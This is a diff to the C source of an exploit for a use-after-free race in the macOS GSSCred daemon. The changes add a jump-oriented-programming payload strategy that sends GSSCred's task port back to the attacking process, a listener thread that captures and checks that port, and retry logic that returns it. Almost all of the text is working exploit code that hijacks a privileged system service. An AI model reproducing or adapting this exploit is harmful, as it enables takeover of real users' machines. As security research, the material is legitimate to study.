@@ -447,8 +447,7 @@
  *  My preferred technique for writing a payload when I can't inject code is to use jump-oriented
  *  programming, or JOP. I used this vulnerability as an opportunity to practice writing more
  *  complex JOP programs, and in particular to practice using loops and conditionals. I make no
- *  claim that the strategy outlined here is the cleanest, best, or most efficient design. That
- *  being said, here is my strategy.
+ *  claim that the strategy outlined here is the cleanest, best, or most efficient design.
  *
  *  Borrowing a technique from triple_fetch [1], I wanted to have the exploit payload send a Mach
  *  message containing GSSCred's task port from GSSCred back to our process. The challenge is that
@@ -462,16 +461,26 @@
  *  of the hardcoded Mach port names used in the payload will be a send right back to the
  *  exploiting process.
  *
- *  I decided to try the inverse: send a single Mach send right, then have the exploit payload try
- *  to send the Mach message to thousands of different Mach port names, hopefully hitting the one
- *  corresponding to the send right back to our process. One prominent advantage of this design is
- *  that it can take up significantly less space (we no longer need a massive Mach port spray, and
- *  the ARM64-specific part of the payload could easily be packed down to 400 bytes).
+ *  I decided to try the inverse: send a single Mach send right to GSSCred, then have the exploit
+ *  payload try to send the Mach message to thousands of different Mach port names, hopefully
+ *  hitting the one corresponding to the send right back to our process. One prominent advantage of
+ *  this design is that it can take up significantly less space (we no longer need a massive Mach
+ *  port spray, and the ARM64-specific part of the payload could easily be packed down to 400
+ *  bytes).
  *
  *  The other strategy I was contemplating was to try and deduce the Mach send right name directly,
  *  either by working backwards from the current register values or stack contents or by scanning
  *  memory. However, this seemed more complicated and more fragile than simply spraying Mach
  *  messages to every possible port name.
+ *
+ *  Once GSSCred sends all the Mach messages, we need to finish in a way that doesn't cause GSSCred
+ *  to crash. Since it seemed difficult to repair the corruption and resume executing from where
+ *  we hijacked control, the exploit payload simply enters an infinite loop. This means that
+ *  GSSCred will never reply to the "setattributes" request that caused the exploit payload to be
+ *  executed.
+ *
+ *  Back in our process, we can listen on the receiving end of the Mach port we sent to GSSCred for
+ *  a message. If a message is received, that means we won the race and the exploit succeeded.
  *
  *
  *  TODO
@@ -534,7 +543,8 @@ static const unsigned RETRY_RACE_DELAY              = 200000;	// 200 ms
 static const unsigned INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US   = 0;
 static const unsigned SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US = 200;
 
-static const size_t   MAX_TRIES = 300;
+static const size_t   MAX_TRIES_TO_WIN_THE_RACE  = 300;
+static const size_t   MAX_TRIES_TO_GET_TASK_PORT = 16;
 
 // ---- Parameters for building the controlled page -----------------------------------------------
 
@@ -568,6 +578,8 @@ struct gsscred_race_state {
 	// The current delay between sending the setattributes request and sending the delete
 	// request.
 	unsigned setattributes_to_delete_delay;
+	// GSSCred's task port. This is what we are trying to get.
+	mach_port_t gsscred_task_port;
 };
 
 // Generate a large mapping consisting of many copies of the given data. Note that changes to the
@@ -657,7 +669,7 @@ gsscred_race_build_payload_spray(uint8_t *payload) {
 }
 
 // Create a Mach port that will receive a message sent by our exploit payload from GSSCred's
-// process.
+// process. Destroy the listener port with mach_port_destroy().
 static void
 gsscred_race_create_listener_port(struct gsscred_race_state *state) {
 	mach_port_t port = MACH_PORT_NULL;
@@ -672,7 +684,6 @@ gsscred_race_create_listener_port(struct gsscred_race_state *state) {
 static void
 gsscred_race_build_requests(struct gsscred_race_state *state) {
 	uuid_t uuid  = { 0xab };
-
 	// Build the create request for the credential:
 	// {
 	//     "command":    "create",
@@ -691,7 +702,6 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	xpc_dictionary_set_value( create_request, "attributes", create_attributes);
 	xpc_release(create_attributes);
 	state->create_request = create_request;
-
 	// Generate the UAF string and the exploit payload. The UAF string is the string that will
 	// be deserialized repeatedly in the hope that it overwrites the freed HeimCred, causing
 	// various object accesses to redirect to our exploit payload and eventually triggering
@@ -700,12 +710,10 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	uint8_t *payload = malloc(GSSCRED_RACE_PAYLOAD_SIZE);
 	assert(payload != NULL);
 	gsscred_race_build_payload(uaf_string, payload);
-
 	// Generate the XPC data object that we will spray into GSSCred to map
 	// GSSCRED_RACE_PAYLOAD_ADDRESS with our exploit payload.
 	xpc_object_t payload_spray = gsscred_race_build_payload_spray(payload);
 	free(payload);
-
 	// Build the setattributes request for the target credential:
 	// {
 	//     "command":    "setattributes",
@@ -717,8 +725,9 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	//             ...,
 	//         ],
 	//     },
-	//     "data_0":     <memory entry>,
-	//     "data_1":     <memory entry>,
+	//     "mach_send":  <send right to listener port>,
+	//     "data_0":     <memory entry containing payload>,
+	//     "data_1":     <memory entry containing payload>,
 	//     ...,
 	// }
 	xpc_object_t new_acl               = xpc_array_create(NULL, 0);
@@ -741,7 +750,6 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	xpc_release(new_attributes);
 	xpc_release(payload_spray);
 	state->setattributes_request = setattributes_request;
-
 	// Build the delete request for the credential.
 	// {
 	//     "command": "delete",
@@ -758,6 +766,81 @@ gsscred_race_build_requests(struct gsscred_race_state *state) {
 	xpc_dictionary_set_value( delete_request, "query",   delete_query);
 	xpc_release(delete_query);
 	state->delete_request = delete_request;
+}
+
+// Start a thread to listen for the message sent by the exploit payload running in GSSCred.
+static void
+gsscred_race_start_port_listener(struct gsscred_race_state *state) {
+	dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
+		// We want to wait for either of two events to occur: either we will receive a Mach
+		// message from our exploit payload running inside of GSSCred, or we will never win
+		// the race and gsscred_race_deinit() will be called. The latter destroys the Mach
+		// port on which we're listening, so that's sufficient.
+		struct {
+			mach_msg_header_t  hdr;
+			mach_msg_trailer_t trailer;
+		} msg;
+		// Loop until we get the task port.
+		for (;;) {
+			// Listen for a Mach message on the listener port.
+			kern_return_t kr = mach_msg(&msg.hdr,
+					MACH_RCV_MSG | MACH_MSG_TIMEOUT_NONE,
+					0,
+					sizeof(msg),
+					state->listener_port,
+					0,
+					MACH_PORT_NULL);
+			if (kr != KERN_SUCCESS) {
+				// We are probably shutting down in gsscred_race_deinit(). Exit
+				// this thread immediately, without touching state.
+				ERROR("Receiving on Mach port listener returned %x", kr);
+				return;
+			}
+			if (msg.hdr.msgh_id != GSSCRED_RACE_MACH_MESSAGE_ID) {
+				DEBUG_TRACE(1, "Received unexpected message ID %x on listener "
+						"port", msg.hdr.msgh_id);
+				continue;
+			}
+			// Check that the task port we received for GSSCred is valid.
+			mach_port_t gsscred_task = msg.hdr.msgh_remote_port;
+			int gsscred_pid = -1;
+			kr = pid_for_task(gsscred_task, &gsscred_pid);
+			if (kr != KERN_SUCCESS) {
+				WARNING("Message from exploit payload contains invalid "
+						"task port %x: %x", gsscred_task, kr);
+				continue;
+			}
+			// Everything looks good! Save the task port, cancel the connection, and
+			// exit. Cancelling the connection will cause the setattributes reply
+			// handler in gsscred_race_setattributes_async() to be invoked with
+			// XPC_ERROR_CONNECTION_INVALID if it hasn't fired already.
+			DEBUG_TRACE(1, "Got the task port: %x", gsscred_task);
+			DEBUG_TRACE(1, "GSSCred's PID is %u", gsscred_pid);
+			state->gsscred_task_port = gsscred_task;
+			xpc_connection_cancel(state->setattributes_connection);
+			return;
+		}
+	});
+}
+
+// Initialize the state for exploiting the GSSCred race condition.
+static void
+gsscred_race_init(struct gsscred_race_state *state) {
+	state->gsscred_task_port = MACH_PORT_NULL;
+	gsscred_race_create_listener_port(state);
+	gsscred_race_build_requests(state);
+	state->setattributes_reply_done = dispatch_semaphore_create(0);
+	gsscred_race_start_port_listener(state);
+}
+
+// Clean up all resources used by the GSSCred race state.
+static void
+gsscred_race_deinit(struct gsscred_race_state *state) {
+	xpc_release(state->create_request);
+	xpc_release(state->setattributes_request);
+	xpc_release(state->delete_request);
+	mach_port_destroy(mach_task_self(), state->listener_port);
+	dispatch_release(state->setattributes_reply_done);
 }
 
 // Generate a connection to GSSCred with the specified event handler.
@@ -792,7 +875,6 @@ gsscred_race_open_connections(struct gsscred_race_state *state) {
 		free(desc);
 #endif
 	});
-
 	// Create the connection on which we will send the delete message.
 	state->delete_connection = gsscred_xpc_connect(^(xpc_object_t event) {
 		gsscred_race_check_interrupted(state, event);
@@ -802,7 +884,6 @@ gsscred_race_open_connections(struct gsscred_race_state *state) {
 		free(desc);
 #endif
 	});
-
 	// Initialize state variables for the connections.
 	state->connection_interrupted = false;
 }
@@ -814,24 +895,6 @@ gsscred_race_close_connections(struct gsscred_race_state *state) {
 	xpc_connection_cancel(state->delete_connection);
 	xpc_release(state->setattributes_connection);
 	xpc_release(state->delete_connection);
-}
-
-// Initialize the state for exploiting the GSSCred race condition.
-static void
-gsscred_race_init(struct gsscred_race_state *state) {
-	gsscred_race_create_listener_port(state);
-	gsscred_race_build_requests(state);
-	state->setattributes_reply_done = dispatch_semaphore_create(0);
-}
-
-// Clean up all resources used by the GSSCred race state.
-static void
-gsscred_race_deinit(struct gsscred_race_state *state) {
-	xpc_release(state->create_request);
-	xpc_release(state->setattributes_request);
-	xpc_release(state->delete_request);
-	mach_port_deallocate(mach_task_self(), state->listener_port);
-	dispatch_release(state->setattributes_reply_done);
 }
 
 // Send the credential creation request to GSSCred.
@@ -898,87 +961,95 @@ gsscred_race_synchronize(struct gsscred_race_state *state) {
 // Run the race condition.
 static bool
 gsscred_race_run(struct gsscred_race_state *state) {
-	bool success = false;
-
+	bool done = false;
 	// Open the connections to the GSSCred service.
 	gsscred_race_open_connections(state);
-
 	// First send a delete message to make sure GSSCred is up and running, then give it time to
 	// initialize.
 	gsscred_race_delete_credential_sync(state);
 	sleep(1);
-
 	// Initialize the delay between setattributes and delete.
 	state->setattributes_to_delete_delay = INITIAL_SETATTRIBUTES_TO_DELETE_DELAY_US;
-
 	// Loop until we win.
 	for (size_t try = 1;; try++) {
-		DEBUG_TRACE(1, "Trying %u", state->setattributes_to_delete_delay);
-
+		DEBUG_TRACE(1, "Trying delay %u", state->setattributes_to_delete_delay);
 		// Create the credential synchronously.
 		bool ok = gsscred_race_create_credential_sync(state);
 		if (!ok) {
 			ERROR("Could not create the credential");
+			done = true;
 			break;
 		}
-
 		// Wait a little while after creating the credential for GSSCred's allocator to
 		// calm down. Probably not necessary, but better safe than sorry.
 		usleep(POST_CREATE_CREDENTIAL_DELAY);
-
 		// Send the setattributes request asynchronously. do_SetAttrs() will store a
 		// pointer to the target credential on the stack and then loop continuously
 		// allocating memory. The reuse of this pointer later in the function is the UAF,
 		// and our race window is however long do_SetAttrs() spends in the allocation loop.
 		gsscred_race_setattributes_async(state);
-
 		// Sleep for awhile, until there's a good chance that the delete request will
 		// arrive in the middle of the race window.
 		usleep(state->setattributes_to_delete_delay);
-
 		// Send the delete message synchronously.
 		gsscred_race_delete_credential_sync(state);
-
 		// Wait for the setattributes request to finish.
 		gsscred_race_synchronize(state);
-
+		// If we got a task port, then we're done!
+		if (state->gsscred_task_port != MACH_PORT_NULL) {
+			DEBUG_TRACE(1, "Success! Won the race after %zu %s", try,
+					(try == 1 ? "try" : "tries"));
+			done = true;
+			break;
+		}
 		// If we got a Connection Interrupted error, then we crashed GSSCred.
 		if (state->connection_interrupted) {
-			DEBUG_TRACE(1, "Crash!");
-			DEBUG_TRACE(1, "Won the race after %zu %s", try,
-					(try == 1 ? "try" : "tries"));
-			success = true;
+			DEBUG_TRACE(1, "Crash! Won the race after %zu %s, but failed to get "
+					"GSSCred task port", try, (try == 1 ? "try" : "tries"));
 			break;
 		}
-
 		DEBUG_TRACE(2, "Lost the race, trying again...");
 		// If we've run out of tries, give up.
-		if (try >= MAX_TRIES) {
-			ERROR("Could not win the race after %zu tries", try);
+		if (try >= MAX_TRIES_TO_WIN_THE_RACE) {
+			WARNING("Could not win the race after %zu tries", try);
 			break;
 		}
-
 		// Increase the delay.
 		state->setattributes_to_delete_delay += SETATTRIBUTES_TO_DELETE_DELAY_INCREMENT_US;
-
 		// If we didn't get a Connection Interrupted error, then GSSCred is still running.
 		// Sleep for awhile to let GSSCred settle down, then try again.
 		usleep(RETRY_RACE_DELAY);
 	}
-
 	// Close the connections to GSSCred.
 	gsscred_race_close_connections(state);
-
-	return success;
+	// Return whether we should stop trying.
+	return done;
 }
 
 // ---- Public API --------------------------------------------------------------------------------
 
-bool gsscred_race() {
+mach_port_t
+gsscred_race() {
 	DEBUG_TRACE(1, "gsscred_race");
 	struct gsscred_race_state state;
+	// Initialize the race state.
 	gsscred_race_init(&state);
-	bool success = gsscred_race_run(&state);
+	// Repeatedly try to win the race condition and execute our exploit payload.
+	for (size_t try = 1;; try++) {
+		// Try to win the race condition. If we succeed or encounter a fatal error, abort.
+		bool done = gsscred_race_run(&state);
+		if (done) {
+			break;
+		}
+		// If we've tried and failed too many times, give up.
+		if (try >= MAX_TRIES_TO_GET_TASK_PORT) {
+			ERROR("Could not get GSSCred's task port after %zu %s",
+					try, (try == 1 ? "try" : "tries"));
+			break;
+		}
+	}
+	// Clean up all race state.
 	gsscred_race_deinit(&state);
-	return success;
+	// Return the GSSCred task port, if we managed to get it.
+	return state.gsscred_task_port;
 }
